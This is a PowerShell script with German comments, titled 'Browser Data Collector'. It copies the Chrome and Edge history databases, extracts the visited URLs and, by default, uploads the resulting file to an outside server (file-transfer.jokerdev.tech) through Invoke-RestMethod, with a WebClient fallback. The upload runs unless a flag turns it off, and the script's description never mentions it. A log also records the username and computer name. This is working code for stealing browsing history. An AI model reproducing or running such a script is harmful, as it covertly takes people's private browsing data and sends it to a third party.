<#
.SYNOPSIS
    Browser Data Collector
    
.DESCRIPTION
    Sammelt Browser-History von Chrome, Edge und Firefox.
    
.EXAMPLE
    .\BrowserDataCollector.ps1
#>

#region Parameter
param(
    [string]$OutputDir = $env:TEMP,
    [switch]$NoUpload,
    [switch]$DryRun,
    [switch]$Help
)

if ($Help) {
    Get-Help $MyInvocation.MyCommand.Path -Detailed
    exit 0
}
#endregion

#region Initialisierung
Write-Host "=== Browser Data Collector ===" -ForegroundColor Cyan
Write-Host "Startzeit: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Gray

# HashSet für eindeutige URLs
$collectedUrls = New-Object 'System.Collections.Generic.HashSet[string]'

# Ergebnisse
$results = @{
    TotalUrls = 0
    Browsers = @()
    Errors = @()
}
#endregion

#region Hilfsfunktionen
function Write-Status {
    param(
        [string]$Message,
        [string]$Type = "Info"
    )
    
    $colors = @{
        Info = "Gray"
        Success = "Green"
        Warning = "Yellow"
        Error = "Red"
        Verbose = "DarkGray"
    }
    
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $Message" -ForegroundColor $colors[$Type]
}

function Test-ValidUrl {
    param([string]$Url)
    
    # Grundlegende Validierung
    if ([string]::IsNullOrWhiteSpace($Url)) { return $false }
    if ($Url.Length -lt 10) { return $false }
    
    # Muss mit http:// oder https:// beginnen
    if ($Url -notmatch '^https?://') { return $false }
    
    # Keine Browser-interne URLs
    if ($Url -match '^(chrome|edge|opera|about|file|data|javascript):') { return $false }
    
    # Keine lokalen Adressen
    if ($Url -match 'localhost|127\.0\.0\.1|\.local') { return $false }
    
    # Muss eine Domain haben
    if ($Url -notmatch '\.(com|org|net|de|info|io|tv|me|uk|fr|es|it|ru|ch|at|edu|gov)(:\d+)?(/|$)') {
        return $false
    }
    
    return $true
}

function Extract-UrlsFromFile {
    param(
        [string]$SourcePath,
        [string]$BrowserName
    )
    
    $tempFile = $null
    $extractedCount = 0
    
    try {
        Write-Status "Verarbeite ${BrowserName}: $(Split-Path $SourcePath -Leaf)" -Type "Verbose"
        
        # Temporäre Kopie erstellen
        $tempGuid = [guid]::NewGuid().ToString()
        $tempFile = Join-Path $env:TEMP "bdc_${BrowserName}_${tempGuid}.tmp"
        
        Copy-Item -Path $SourcePath -Destination $tempFile -Force -ErrorAction Stop
        
        # Dateiinhalt lesen
        $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
        $fileText = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        
        # URLs extrahieren
        $urlPattern = 'https?://(?:[-\w]+\.)+[-\w]+(?::\d+)?(?:/[^\s""<>]*)?'
        $urlMatches = [regex]::Matches($fileText, $urlPattern, 'IgnoreCase')
        
        foreach ($match in $urlMatches) {
            $url = $match.Value.Trim()
            
            if (Test-ValidUrl -Url $url) {
                if ($collectedUrls.Add($url)) {
                    $extractedCount++
                }
            }
        }
        
        if ($extractedCount -gt 0) {
            Write-Status "${BrowserName}: $extractedCount URLs gefunden" -Type "Success"
        }
        
        return $extractedCount
    }
    catch {
        $errorMsg = "Fehler bei ${BrowserName}: $_"
        Write-Status $errorMsg -Type "Error"
        $results.Errors += $errorMsg
        return 0
    }
    finally {
        # Temporäre Datei löschen
        if ($tempFile -and (Test-Path $tempFile)) {
            Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
        }
    }
}
#endregion

#region Browser-Definitionen
$browsers = @(
    @{
        Name = "Chrome"
        Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
        Active = $true
    },
    @{
        Name = "Edge"
        Path = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
        Active = $true
    },
    @{
        Name = "Firefox"
        Path = (Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\" -Directory -ErrorAction SilentlyContinue | 
                ForEach-Object { Join-Path $_.FullName "places.sqlite" } |
                Where-Object { Test-Path $_ } | Select-Object -First 1)
        Active = $false  # Firefox kann Probleme machen
    }
)
#endregion

#region Hauptlogik
try {
    # Browser-Daten sammeln
    foreach ($browser in $browsers) {
        if (-not $browser.Active) {
            Write-Status "Browser $($browser.Name) ist deaktiviert" -Type "Warning"
            continue
        }
        
        if (Test-Path $browser.Path) {
            Write-Status "Lese $($browser.Name) History..." -Type "Info"
            
            $count = Extract-UrlsFromFile -SourcePath $browser.Path -BrowserName $browser.Name
            $results.TotalUrls += $count
            
            if ($count -gt 0) {
                $results.Browsers += "$($browser.Name): $count URLs"
            }
        }
        else {
            Write-Status "$($browser.Name) nicht gefunden" -Type "Verbose"
        }
    }
    
    # Ergebnisse anzeigen
    Write-Host "`n=== ERGEBNISSE ===" -ForegroundColor Cyan
    Write-Host "Gesammelte URLs: $($collectedUrls.Count)" -ForegroundColor Green
    
    if ($collectedUrls.Count -gt 0) {
        Write-Host "`nBeispiele:" -ForegroundColor Yellow
        $collectedUrls | Select-Object -First 5 | ForEach-Object {
            Write-Host "  $_" -ForegroundColor Gray
        }
        
        # Datei speichern
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $outputFile = Join-Path $OutputDir "browser_urls_${timestamp}.txt"
        
        if (-not $DryRun) {
            # Verzeichnis erstellen falls nötig
            if (-not (Test-Path $OutputDir)) {
                New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
            }
            
            # URLs sortiert speichern
            $sortedUrls = $collectedUrls | Sort-Object
            $sortedUrls | Out-File -FilePath $outputFile -Encoding UTF8
            
            Write-Host "`nDatei gespeichert: $outputFile" -ForegroundColor Green
            
            # Upload (falls nicht deaktiviert)
            if (-not $NoUpload -and -not $DryRun) {
                Write-Host "`n=== UPLOAD ===" -ForegroundColor Cyan
                
                try {
                    $fileName = Split-Path $outputFile -Leaf
                    $uploadUrl = "https://file-transfer.jokerdev.tech/upload/${fileName}"
                    
                    Write-Host "Upload an: $uploadUrl" -ForegroundColor Gray
                    
                    # Methode 1: Invoke-RestMethod
                    $fileBytes = [System.IO.File]::ReadAllBytes($outputFile)
                    Invoke-RestMethod -Uri $uploadUrl -Method Put -Body $fileBytes `
                        -ContentType "application/octet-stream" -ErrorAction Stop
                    
                    Write-Host "Upload erfolgreich!" -ForegroundColor Green
                }
                catch {
                    Write-Host "Upload fehlgeschlagen: $_" -ForegroundColor Red
                    
                    # Methode 2: WebClient als Fallback
                    try {
                        $webClient = New-Object System.Net.WebClient
                        $webClient.UploadFile($uploadUrl, $outputFile)
                        Write-Host "Upload mit WebClient erfolgreich!" -ForegroundColor Green
                    }
                    catch {
                        Write-Host "Auch WebClient fehlgeschlagen" -ForegroundColor Red
                    }
                }
            }
        }
        else {
            Write-Host "`nTROCKENLAUF: Datei würde gespeichert werden als: $outputFile" -ForegroundColor Yellow
            Write-Host "TROCKENLAUF: Upload wäre deaktiviert" -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "Keine URLs gefunden" -ForegroundColor Yellow
    }
    
    # Bericht
    $logFile = Join-Path $OutputDir "collection_log_${timestamp}.txt"
    @"
Browser Data Collector Log
==========================
Zeitpunkt: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Benutzer: $env:USERNAME
Computer: $env:COMPUTERNAME
Gesammelte URLs: $($collectedUrls.Count)
Verarbeitete Browser: $($results.Browsers.Count)
$(if ($results.Browsers.Count -gt 0) { $results.Browsers -join "`n" })
$(if ($results.Errors.Count -gt 0) { "Fehler:`n" + ($results.Errors -join "`n") })
"@ | Out-File -FilePath $logFile -Encoding UTF8
    
    Write-Host "`nLog-Datei: $logFile" -ForegroundColor Gray
}
catch {
    Write-Host "Kritischer Fehler: $_" -ForegroundColor Red
    Write-Host "Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor DarkRed
    exit 1
}
#endregion

Write-Host "`n=== FERTIG ===" -ForegroundColor Cyan
Write-Host "Das Fenster schließt in 5 Sekunden..." -ForegroundColor Gray
Start-Sleep -Seconds 5
